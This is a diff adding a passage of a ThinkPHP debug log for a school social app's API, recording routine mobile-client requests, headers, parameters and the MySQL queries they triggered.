+  'tk' => '51a1682117202dfc189675a97e34ca33',
+)
+[ info ] [ CACHE ] INIT File
+[ info ] [ RUN ] app\api\controller\Sociality->serveObtain[ /data/web/php/ischool/application/api/controller/Sociality.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.011421s ] mysql:host=127.0.0.1;port=3306;dbname=ischool;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `users` [ RunTime:0.000972s ]
+[ sql ] [ SQL ] SELECT `school` FROM `users` WHERE  `user_id` = 33 LIMIT 1 [ RunTime:0.000405s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `s_serve` [ RunTime:0.000698s ]
+[ sql ] [ SQL ] SELECT sst.id type_id,st.type_name p_name,ss.plays_id serve_id,`event_title`,`sst`.`type_name`,`u`.`head_image`,`u`.`nickname`,`us`.`grade`,`ss`.`user_id`,`ss`.`launch`,`ss`.`charging`,`ss`.`funds`,`ss`.`images` FROM `s_serve` `ss` LEFT JOIN `s_sociality_type` `sst` ON `ss`.`about_type_id`=`sst`.`id` LEFT JOIN `sociality_type` `st` ON `st`.`id`=`sst`.`type_id` LEFT JOIN `users` `u` ON `ss`.`user_id`=`u`.`user_id` LEFT JOIN `users_secretary` `us` ON `u`.`user_id`=`us`.`user_id` WHERE  `st`.`pid` = 1  AND (   u.school=1 )  AND `end_times` > 1549169862  AND `ss`.`status` = 1 ORDER BY `ss`.`launch` DESC LIMIT 0,10 [ RunTime:0.000566s ]
+---------------------------------------------------------------
+[ 2019-02-03T12:57:42+08:00 ] 60.255.76.130 POST 148.70.73.177/api/sociality/playsObtain
+[运行时间：0.049805s] [吞吐率：20.08req/s] [内存消耗：2,649.41kb] [文件加载：54]
+[ info ] [ LANG ] /data/web/php/ischool/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'api',
+    1 => 'sociality',
+    2 => 'playsObtain',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'okhttp/3.10.0',
+  'accept-encoding' => 'gzip',
+  'connection' => 'Keep-Alive',
+  'host' => '148.70.73.177',
+  'content-length' => '46',
+  'content-type' => 'application/x-www-form-urlencoded',
+  'cache-control' => 'max-age=30',
+)
+[ info ] [ PARAM ] array (
+  'user_id' => '33',
+  'tk' => '51a1682117202dfc189675a97e34ca33',
+)
+[ info ] [ CACHE ] INIT File
+[ info ] [ RUN ] app\api\controller\Sociality->playsObtain[ /data/web/php/ischool/application/api/controller/Sociality.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.003821s ] mysql:host=127.0.0.1;port=3306;dbname=ischool;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `users` [ RunTime:0.000773s ]
+[ sql ] [ SQL ] SELECT `school` FROM `users` WHERE  `user_id` = 33 LIMIT 1 [ RunTime:0.000285s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `sociality_type` [ RunTime:0.000554s ]
+[ sql ] [ SQL ] SELECT `st`.`id`,`st`.`type_name` FROM `sociality_type` `st` WHERE  `pid` = 2 [ RunTime:0.000310s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `s_sociality_type` [ RunTime:0.000466s ]
+[ sql ] [ SQL ] SELECT `id` FROM `s_sociality_type` WHERE  `type_id` = 6 [ RunTime:0.000217s ]
+[ sql ] [ SQL ] SELECT `id` FROM `s_sociality_type` WHERE  `type_id` = 7 [ RunTime:0.000248s ]
+[ sql ] [ SQL ] SELECT `id` FROM `s_sociality_type` WHERE  `type_id` = 8 [ RunTime:0.000191s ]
+[ sql ] [ SQL ] SELECT `id` FROM `s_sociality_type` WHERE  `type_id` = 9 [ RunTime:0.000206s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `plays` [ RunTime:0.000539s ]
+[ sql ] [ SQL ] SELECT `p`.`plays_id`,`p`.`event_title`,`sst`.`type_name`,`u`.`head_image`,`p`.`user_id`,`u`.`nickname`,`us`.`grade`,`p`.`launch`,`p`.`funds`,`p`.`images`,`p`.`p_start`,`p`.`end_times`,`u`.`sex`,`p`.`p_address`,`p`.`number`,`p`.`ask` FROM `plays` `p` LEFT JOIN `s_sociality_type` `sst` ON `p`.`about_type_id`=`sst`.`id` LEFT JOIN `sociality_type` `st` ON `st`.`id`=`sst`.`type_id` LEFT JOIN `users` `u` ON `p`.`user_id`=`u`.`user_id` LEFT JOIN `users_secretary` `us` ON `u`.`user_id`=`us`.`user_id` WHERE  (   p.about_type_id in ( 9,11 ) and u.school=1 )  AND `p_start` > 1549169862  AND `p`.`status` = 1 ORDER BY `p`.`launch` DESC LIMIT 0,3 [ RunTime:0.000651s ]
+[ sql ] [ SQL ] SELECT `p`.`plays_id`,`p`.`event_title`,`sst`.`type_name`,`u`.`head_image`,`p`.`user_id`,`u`.`nickname`,`us`.`grade`,`p`.`launch`,`p`.`funds`,`p`.`images`,`p`.`p_start`,`p`.`end_times`,`u`.`sex`,`p`.`p_address`,`p`.`number`,`p`.`ask` FROM `plays` `p` LEFT JOIN `s_sociality_type` `sst` ON `p`.`about_type_id`=`sst`.`id` LEFT JOIN `sociality_type` `st` ON `st`.`id`=`sst`.`type_id` LEFT JOIN `users` `u` ON `p`.`user_id`=`u`.`user_id` LEFT JOIN `users_secretary` `us` ON `u`.`user_id`=`us`.`user_id` WHERE  (   p.about_type_id in ( 6 ) and u.school=1 )  AND `p_start` > 1549169862  AND `p`.`status` = 1 ORDER BY `p`.`launch` DESC LIMIT 0,3 [ RunTime:0.000558s ]
+[ sql ] [ SQL ] SELECT `p`.`plays_id`,`p`.`event_title`,`sst`.`type_name`,`u`.`head_image`,`p`.`user_id`,`u`.`nickname`,`us`.`grade`,`p`.`launch`,`p`.`funds`,`p`.`images`,`p`.`p_start`,`p`.`end_times`,`u`.`sex`,`p`.`p_address`,`p`.`number`,`p`.`ask` FROM `plays` `p` LEFT JOIN `s_sociality_type` `sst` ON `p`.`about_type_id`=`sst`.`id` LEFT JOIN `sociality_type` `st` ON `st`.`id`=`sst`.`type_id` LEFT JOIN `users` `u` ON `p`.`user_id`=`u`.`user_id` LEFT JOIN `users_secretary` `us` ON `u`.`user_id`=`us`.`user_id` WHERE  (   p.about_type_id in ( 7 ) and u.school=1 )  AND `p_start` > 1549169862  AND `p`.`status` = 1 ORDER BY `p`.`launch` DESC LIMIT 0,3 [ RunTime:0.000583s ]
+[ sql ] [ SQL ] SELECT `p`.`plays_id`,`p`.`event_title`,`sst`.`type_name`,`u`.`head_image`,`p`.`user_id`,`u`.`nickname`,`us`.`grade`,`p`.`launch`,`p`.`funds`,`p`.`images`,`p`.`p_start`,`p`.`end_times`,`u`.`sex`,`p`.`p_address`,`p`.`number`,`p`.`ask` FROM `plays` `p` LEFT JOIN `s_sociality_type` `sst` ON `p`.`about_type_id`=`sst`.`id` LEFT JOIN `sociality_type` `st` ON `st`.`id`=`sst`.`type_id` LEFT JOIN `users` `u` ON `p`.`user_id`=`u`.`user_id` LEFT JOIN `users_secretary` `us` ON `u`.`user_id`=`us`.`user_id` WHERE  (   p.about_type_id in ( 8 ) and u.school=1 )  AND `p_start` > 1549169862  AND `p`.`status` = 1 ORDER BY `p`.`launch` DESC LIMIT 0,3 [ RunTime:0.000573s ]
+---------------------------------------------------------------
+[ 2019-02-03T12:57:42+08:00 ] 60.255.76.130 POST 148.70.73.177/api/sociality/getModule
+[运行时间：0.041594s] [吞吐率：24.04req/s] [内存消耗：2,610.99kb] [文件加载：53]
+[ info ] [ LANG ] /data/web/php/ischool/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'api',
+    1 => 'sociality',
+    2 => 'getModule',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'okhttp/3.10.0',
+  'accept-encoding' => 'gzip',
+  'connection' => 'Keep-Alive',
+  'host' => '148.70.73.177',
+  'content-length' => '46',
+  'content-type' => 'application/x-www-form-urlencoded',
+  'cache-control' => 'max-age=30',
+)
+[ info ] [ PARAM ] array (
+  'tk' => '51a1682117202dfc189675a97e34ca33',
+  'user_id' => '33',
+)
+[ info ] [ CACHE ] INIT File
+[ info ] [ RUN ] app\api\controller\Sociality->getModule[ /data/web/php/ischool/application/api/controller/Sociality.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000474s ] mysql:host=127.0.0.1;port=3306;dbname=ischool;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `sociality_type` [ RunTime:0.000898s ]
+[ sql ] [ SQL ] SELECT type_name s_type_name,id pid,`icon` FROM `sociality_type` WHERE  `pid` = 0 [ RunTime:0.000393s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `s_sociality_type` [ RunTime:0.000916s ]
+[ sql ] [ SQL ] SELECT sst.type_name s_type_name,sst.id s_type_id,`sst`.`icon`,`st`.`pid`,st.id type_id,`st`.`type_name` FROM `s_sociality_type` `sst` LEFT JOIN `sociality_type` `st` ON `st`.`id`=`sst`.`type_id` WHERE  `sst`.`id` = '11' LIMIT 1 [ RunTime:0.000499s ]
+[ sql ] [ SQL ] SELECT sst.type_name s_type_name,sst.id s_type_id,`sst`.`icon`,`st`.`pid`,st.id type_id,`st`.`type_name` FROM `s_sociality_type` `sst` LEFT JOIN `sociality_type` `st` ON `st`.`id`=`sst`.`type_id` WHERE  `sst`.`id` = '5' LIMIT 1 [ RunTime:0.000315s ]
+[ sql ] [ SQL ] SELECT sst.type_name s_type_name,sst.id s_type_id,`sst`.`icon`,`st`.`pid`,st.id type_id,`st`.`type_name` FROM `s_sociality_type` `sst` LEFT JOIN `sociality_type` `st` ON `st`.`id`=`sst`.`type_id` WHERE  `sst`.`id` = '6' LIMIT 1 [ RunTime:0.000329s ]
+---------------------------------------------------------------
+[ 2019-02-03T12:57:48+08:00 ] 60.255.76.130 POST 148.70.73.177/api/sociality/playsObtain
+[运行时间：0.054480s] [吞吐率：18.36req/s] [内存消耗：2,649.41kb] [文件加载：54]
+[ info ] [ LANG ] /data/web/php/ischool/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'api',
+    1 => 'sociality',
+    2 => 'playsObtain',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'okhttp/3.10.0',
+  'accept-encoding' => 'gzip',
+  'connection' => 'Keep-Alive',
+  'host' => '148.70.73.177',
+  'content-length' => '46',
+  'content-type' => 'application/x-www-form-urlencoded',
+  'cache-control' => 'max-age=30',
+)
+[ info ] [ PARAM ] array (
+  'user_id' => '33',
+  'tk' => '51a1682117202dfc189675a97e34ca33',
+)
+[ info ] [ CACHE ] INIT File
+[ info ] [ RUN ] app\api\controller\Sociality->playsObtain[ /data/web/php/ischool/application/api/controller/Sociality.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.013122s ] mysql:host=127.0.0.1;port=3306;dbname=ischool;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `users` [ RunTime:0.000893s ]
+[ sql ] [ SQL ] SELECT `school` FROM `users` WHERE  `user_id` = 33 LIMIT 1 [ RunTime:0.000260s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `sociality_type` [ RunTime:0.000476s ]
+[ sql ] [ SQL ] SELECT `st`.`id`,`st`.`type_name` FROM `sociality_type` `st` WHERE  `pid` = 2 [ RunTime:0.000217s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `s_sociality_type` [ RunTime:0.000447s ]
+[ sql ] [ SQL ] SELECT `id` FROM `s_sociality_type` WHERE  `type_id` = 6 [ RunTime:0.000203s ]
+[ sql ] [ SQL ] SELECT `id` FROM `s_sociality_type` WHERE  `type_id` = 7 [ RunTime:0.000185s ]
+[ sql ] [ SQL ] SELECT `id` FROM `s_sociality_type` WHERE  `type_id` = 8 [ RunTime:0.000184s ]
+[ sql ] [ SQL ] SELECT `id` FROM `s_sociality_type` WHERE  `type_id` = 9 [ RunTime:0.000206s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `plays` [ RunTime:0.000542s ]
+[ sql ] [ SQL ] SELECT `p`.`plays_id`,`p`.`event_title`,`sst`.`type_name`,`u`.`head_image`,`p`.`user_id`,`u`.`nickname`,`us`.`grade`,`p`.`launch`,`p`.`funds`,`p`.`images`,`p`.`p_start`,`p`.`end_times`,`u`.`sex`,`p`.`p_address`,`p`.`number`,`p`.`ask` FROM `plays` `p` LEFT JOIN `s_sociality_type` `sst` ON `p`.`about_type_id`=`sst`.`id` LEFT JOIN `sociality_type` `st` ON `st`.`id`=`sst`.`type_id` LEFT JOIN `users` `u` ON `p`.`user_id`=`u`.`user_id` LEFT JOIN `users_secretary` `us` ON `u`.`user_id`=`us`.`user_id` WHERE  (   p.about_type_id in ( 9,11 ) and u.school=1 )  AND `p_start` > 1549169868  AND `p`.`status` = 1 ORDER BY `p`.`launch` DESC LIMIT 0,3 [ RunTime:0.000475s ]
+[ sql ] [ SQL ] SELECT `p`.`plays_id`,`p`.`event_title`,`sst`.`type_name`,`u`.`head_image`,`p`.`user_id`,`u`.`nickname`,`us`.`grade`,`p`.`launch`,`p`.`funds`,`p`.`images`,`p`.`p_start`,`p`.`end_times`,`u`.`sex`,`p`.`p_address`,`p`.`number`,`p`.`ask` FROM `plays` `p` LEFT JOIN `s_sociality_type` `sst` ON `p`.`about_type_id`=`sst`.`id` LEFT JOIN `sociality_type` `st` ON `st`.`id`=`sst`.`type_id` LEFT JOIN `users` `u` ON `p`.`user_id`=`u`.`user_id` LEFT JOIN `users_secretary` `us` ON `u`.`user_id`=`us`.`user_id` WHERE  (   p.about_type_id in ( 6 ) and u.school=1 )  AND `p_start` > 1549169868  AND `p`.`status` = 1 ORDER BY `p`.`launch` DESC LIMIT 0,3 [ RunTime:0.003154s ]
+[ sql ] [ SQL ] SELECT `p`.`plays_id`,`p`.`event_title`,`sst`.`type_name`,`u`.`head_image`,`p`.`user_id`,`u`.`nickname`,`us`.`grade`,`p`.`launch`,`p`.`funds`,`p`.`images`,`p`.`p_start`,`p`.`end_times`,`u`.`sex`,`p`.`p_address`,`p`.`number`,`p`.`ask` FROM `plays` `p` LEFT JOIN `s_sociality_type` `sst` ON `p`.`about_type_id`=`sst`.`id` LEFT JOIN `sociality_type` `st` ON `st`.`id`=`sst`.`type_id` LEFT JOIN `users` `u` ON `p`.`user_id`=`u`.`user_id` LEFT JOIN `users_secretary` `us` ON `u`.`user_id`=`us`.`user_id` WHERE  (   p.about_type_id in ( 7 ) and u.school=1 )  AND `p_start` > 1549169868  AND `p`.`status` = 1 ORDER BY `p`.`launch` DESC LIMIT 0,3 [ RunTime:0.000460s ]
+[ sql ] [ SQL ] SELECT `p`.`plays_id`,`p`.`event_title`,`sst`.`type_name`,`u`.`head_image`,`p`.`user_id`,`u`.`nickname`,`us`.`grade`,`p`.`launch`,`p`.`funds`,`p`.`images`,`p`.`p_start`,`p`.`end_times`,`u`.`sex`,`p`.`p_address`,`p`.`number`,`p`.`ask` FROM `plays` `p` LEFT JOIN `s_sociality_type` `sst` ON `p`.`about_type_id`=`sst`.`id` LEFT JOIN `sociality_type` `st` ON `st`.`id`=`sst`.`type_id` LEFT JOIN `users` `u` ON `p`.`user_id`=`u`.`user_id` LEFT JOIN `users_secretary` `us` ON `u`.`user_id`=`us`.`user_id` WHERE  (   p.about_type_id in ( 8 ) and u.school=1 )  AND `p_start` > 1549169868  AND `p`.`status` = 1 ORDER BY `p`.`launch` DESC LIMIT 0,3 [ RunTime:0.000413s ]
+---------------------------------------------------------------
+[ 2019-02-03T12:57:48+08:00 ] 60.255.76.130 POST 148.70.73.177/api/sociality/serveObtain
+[运行时间：0.072331s] [吞吐率：13.83req/s] [内存消耗：2,630.89kb] [文件加载：54]
+[ info ] [ LANG ] /data/web/php/ischool/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'api',
+    1 => 'sociality',
+    2 => 'serveObtain',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'okhttp/3.10.0',
+  'accept-encoding' => 'gzip',
+  'connection' => 'Keep-Alive',
+  'host' => '148.70.73.177',
+  'content-length' => '46',
+  'content-type' => 'application/x-www-form-urlencoded',
+  'cache-control' => 'max-age=30',
+)
+[ info ] [ PARAM ] array (
+  'user_id' => '33',
+  'tk' => '51a1682117202dfc189675a97e34ca33',
+)
+[ info ] [ CACHE ] INIT File
+[ info ] [ RUN ] app\api\controller\Sociality->serveObtain[ /data/web/php/ischool/application/api/controller/Sociality.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.012522s ] mysql:host=127.0.0.1;port=3306;dbname=ischool;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `users` [ RunTime:0.000706s ]
+[ sql ] [ SQL ] SELECT `school` FROM `users` WHERE  `user_id` = 33 LIMIT 1 [ RunTime:0.000227s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `s_serve` [ RunTime:0.001141s ]
+[ sql ] [ SQL ] SELECT sst.id type_id,st.type_name p_name,ss.plays_id serve_id,`event_title`,`sst`.`type_name`,`u`.`head_image`,`u`.`nickname`,`us`.`grade`,`ss`.`user_id`,`ss`.`launch`,`ss`.`charging`,`ss`.`funds`,`ss`.`images` FROM `s_serve` `ss` LEFT JOIN `s_sociality_type` `sst` ON `ss`.`about_type_id`=`sst`.`id` LEFT JOIN `sociality_type` `st` ON `st`.`id`=`sst`.`type_id` LEFT JOIN `users` `u` ON `ss`.`user_id`=`u`.`user_id` LEFT JOIN `users_secretary` `us` ON `u`.`user_id`=`us`.`user_id` WHERE  `st`.`pid` = 1  AND (   u.school=1 )  AND `end_times` > 1549169868  AND `ss`.`status` = 1 ORDER BY `ss`.`launch` DESC LIMIT 0,10 [ RunTime:0.001050s ]
+---------------------------------------------------------------
+[ 2019-02-03T12:57:48+08:00 ] 60.255.76.130 POST 148.70.73.177/api/banner/showBanner
+[运行时间：0.084173s] [吞吐率：11.88req/s] [内存消耗：2,736.14kb] [文件加载：55]
+[ info ] [ LANG ] /data/web/php/ischool/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'api',
+    1 => 'banner',
+    2 => 'showBanner',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'okhttp/3.10.0',
+  'accept-encoding' => 'gzip',
+  'connection' => 'Keep-Alive',
+  'host' => '148.70.73.177',
+  'content-length' => '63',
+  'content-type' => 'application/x-www-form-urlencoded',
+  'cache-control' => 'max-age=30',
+)
+[ info ] [ PARAM ] array (
+  'number' => '-1',
+  'type' => '2',
+  'tk' => '51a1682117202dfc189675a97e34ca33',
+  'user_id' => '33',
+)
+[ info ] [ CACHE ] INIT File
+[ info ] [ DB ] INIT mysql
+[ info ] [ RUN ] app\api\controller\Banner->showBanner[ /data/web/php/ischool/application/api/controller/Banner.php ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.005346s ] mysql:host=127.0.0.1;port=3306;dbname=ischool;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `banner` [ RunTime:0.001239s ]
+[ sql ] [ SQL ] SELECT `banner_id`,`url` FROM `banner` WHERE  `type` = 2  AND `status` = 1 ORDER BY `banner_id` DESC [ RunTime:0.001251s ]
+---------------------------------------------------------------
+[ 2019-02-03T12:57:48+08:00 ] 60.255.76.130 POST 148.70.73.177/api/sociality/getModule
+[运行时间：0.027720s] [吞吐率：36.08req/s] [内存消耗：2,610.99kb] [文件加载：53]
+[ info ] [ LANG ] /data/web/php/ischool/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'api',
+    1 => 'sociality',
+    2 => 'getModule',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'okhttp/3.10.0',
+  'accept-encoding' => 'gzip',
+  'connection' => 'Keep-Alive',
+  'host' => '148.70.73.177',
+  'content-length' => '46',
+  'content-type' => 'application/x-www-form-urlencoded',
+  'cache-control' => 'max-age=30',
+)
+[ info ] [ PARAM ] array (
+  'tk' => '51a1682117202dfc189675a97e34ca33',
+  'user_id' => '33',
+)
+[ info ] [ CACHE ] INIT File
+[ info ] [ RUN ] app\api\controller\Sociality->getModule[ /data/web/php/ischool/application/api/controller/Sociality.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000431s ] mysql:host=127.0.0.1;port=3306;dbname=ischool;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `sociality_type` [ RunTime:0.000805s ]
+[ sql ] [ SQL ] SELECT type_name s_type_name,id pid,`icon` FROM `sociality_type` WHERE  `pid` = 0 [ RunTime:0.000378s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `s_sociality_type` [ RunTime:0.000613s ]
+[ sql ] [ SQL ] SELECT sst.type_name s_type_name,sst.id s_type_id,`sst`.`icon`,`st`.`pid`,st.id type_id,`st`.`type_name` FROM `s_sociality_type` `sst` LEFT JOIN `sociality_type` `st` ON `st`.`id`=`sst`.`type_id` WHERE  `sst`.`id` = '11' LIMIT 1 [ RunTime:0.000308s ]
+[ sql ] [ SQL ] SELECT sst.type_name s_type_name,sst.id s_type_id,`sst`.`icon`,`st`.`pid`,st.id type_id,`st`.`type_name` FROM `s_sociality_type` `sst` LEFT JOIN `sociality_type` `st` ON `st`.`id`=`sst`.`type_id` WHERE  `sst`.`id` = '5' LIMIT 1 [ RunTime:0.000261s ]
+[ sql ] [ SQL ] SELECT sst.type_name s_type_name,sst.id s_type_id,`sst`.`icon`,`st`.`pid`,st.id type_id,`st`.`type_name` FROM `s_sociality_type` `sst` LEFT JOIN `sociality_type` `st` ON `st`.`id`=`sst`.`type_id` WHERE  `sst`.`id` = '6' LIMIT 1 [ RunTime:0.000278s ]
+---------------------------------------------------------------
+[ 2019-02-03T12:57:50+08:00 ] 60.255.76.130 POST 148.70.73.177/api/users/showinfo
+[运行时间：0.045396s] [吞吐率：22.03req/s] [内存消耗：2,803.84kb] [文件加载：56]
+[ info ] [ LANG ] /data/web/php/ischool/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'api',
+    1 => 'users',
+    2 => 'showinfo',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'okhttp/3.10.0',
+  'accept-encoding' => 'gzip',
+  'connection' => 'Keep-Alive',
+  'host' => '148.70.73.177',
+  'content-length' => '46',
+  'content-type' => 'application/x-www-form-urlencoded',
+  'cache-control' => 'max-age=30',
+)
+[ info ] [ PARAM ] array (
+  'user_id' => '33',
+  'tk' => '51a1682117202dfc189675a97e34ca33',
+)
+[ info ] [ CACHE ] INIT File
+[ info ] [ DB ] INIT mysql
+[ info ] [ RUN ] app\api\controller\Users->showInfo[ /data/web/php/ischool/application/api/controller/Users.php ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.007719s ] mysql:host=127.0.0.1;port=3306;dbname=ischool;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `users` [ RunTime:0.000845s ]
+[ sql ] [ SQL ] SELECT `u`.`user_id`,`username`,`nickname`,`kjmessage_id`,s.sname school,`grade`,`u`.`sex`,`u`.`head_image`,`u`.`background_img`,`u`.`signature`,`user_birth` FROM `users` `u` LEFT JOIN `users_secretary` `us` ON `us`.`user_id`=`u`.`user_id` LEFT JOIN `school` `s` ON `u`.`school`=`s`.`id` WHERE  `u`.`user_id` = '33' LIMIT 1 [ RunTime:0.000958s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `follows` [ RunTime:0.001277s ]
+[ sql ] [ SQL ] SELECT count(id) follows FROM `follows` WHERE  `f_user_id` = 33 LIMIT 1 [ RunTime:0.000449s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `comment_fabulous` [ RunTime:0.000780s ]
+[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `comment_fabulous` `cf` LEFT JOIN `comment` `c` ON `cf`.`comment_id`=`c`.`id` LEFT JOIN `users` `u` ON `u`.`user_id`=`c`.`user_id` WHERE  `u`.`user_id` = '33'  AND `cf`.`status` = 1 LIMIT 1 [ RunTime:0.000875s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `activity_fabulous` [ RunTime:0.000903s ]
+[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `activity_fabulous` WHERE  `release_id` = 33 LIMIT 1 [ RunTime:0.000923s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `medal` [ RunTime:0.001166s ]
+[ sql ] [ SQL ] SELECT id medal_id,`medal_name`,`medal_icon` FROM `medal` WHERE  `user_id` = 33 [ RunTime:0.000748s ]
+---------------------------------------------------------------
+[ 2019-02-03T12:57:50+08:00 ] 60.255.76.130 POST 148.70.73.177/api/users/showinfo
+[运行时间：0.055985s] [吞吐率：17.86req/s] [内存消耗：2,803.84kb] [文件加载：56]
+[ info ] [ LANG ] /data/web/php/ischool/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'api',
+    1 => 'users',
+    2 => 'showinfo',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'okhttp/3.10.0',
+  'accept-encoding' => 'gzip',
+  'connection' => 'Keep-Alive',
+  'host' => '148.70.73.177',
+  'content-length' => '46',
+  'content-type' => 'application/x-www-form-urlencoded',
+  'cache-control' => 'max-age=30',
+)
+[ info ] [ PARAM ] array (
+  'user_id' => '33',
+  'tk' => '51a1682117202dfc189675a97e34ca33',
+)
+[ info ] [ CACHE ] INIT File
+[ info ] [ DB ] INIT mysql
+[ info ] [ RUN ] app\api\controller\Users->showInfo[ /data/web/php/ischool/application/api/controller/Users.php ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.002013s ] mysql:host=127.0.0.1;port=3306;dbname=ischool;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `users` [ RunTime:0.001227s ]
+[ sql ] [ SQL ] SELECT `u`.`user_id`,`username`,`nickname`,`kjmessage_id`,s.sname school,`grade`,`u`.`sex`,`u`.`head_image`,`u`.`background_img`,`u`.`signature`,`user_birth` FROM `users` `u` LEFT JOIN `users_secretary` `us` ON `us`.`user_id`=`u`.`user_id` LEFT JOIN `school` `s` ON `u`.`school`=`s`.`id` WHERE  `u`.`user_id` = '33' LIMIT 1 [ RunTime:0.001282s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `follows` [ RunTime:0.000939s ]
+[ sql ] [ SQL ] SELECT count(id) follows FROM `follows` WHERE  `f_user_id` = 33 LIMIT 1 [ RunTime:0.000654s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `comment_fabulous` [ RunTime:0.001179s ]
+[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `comment_fabulous` `cf` LEFT JOIN `comment` `c` ON `cf`.`comment_id`=`c`.`id` LEFT JOIN `users` `u` ON `u`.`user_id`=`c`.`user_id` WHERE  `u`.`user_id` = '33'  AND `cf`.`status` = 1 LIMIT 1 [ RunTime:0.000952s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `activity_fabulous` [ RunTime:0.001055s ]
+[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `activity_fabulous` WHERE  `release_id` = 33 LIMIT 1 [ RunTime:0.001247s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `medal` [ RunTime:0.000496s ]
+[ sql ] [ SQL ] SELECT id medal_id,`medal_name`,`medal_icon` FROM `medal` WHERE  `user_id` = 33 [ RunTime:0.000223s ]
+---------------------------------------------------------------
+[ 2019-02-03T12:57:50+08:00 ] 60.255.76.130 GET 148.70.73.177/null
+[运行时间：0.014666s] [吞吐率：68.18req/s] [内存消耗：1,365.20kb] [文件加载：35]
+[ info ] [ LANG ] /data/web/php/ischool/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'null',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'gzip',
+  'connection' => 'Keep-Alive',
+  'host' => '148.70.73.177',
+  'user-agent' => 'Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-G9500 Build/R16NW)',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-02-03T12:57:50+08:00 ] 60.255.76.130 GET 148.70.73.177/null
+[运行时间：0.012941s] [吞吐率：77.27req/s] [内存消耗：1,365.20kb] [文件加载：35]
+[ info ] [ LANG ] /data/web/php/ischool/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'null',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'gzip',
+  'connection' => 'Keep-Alive',
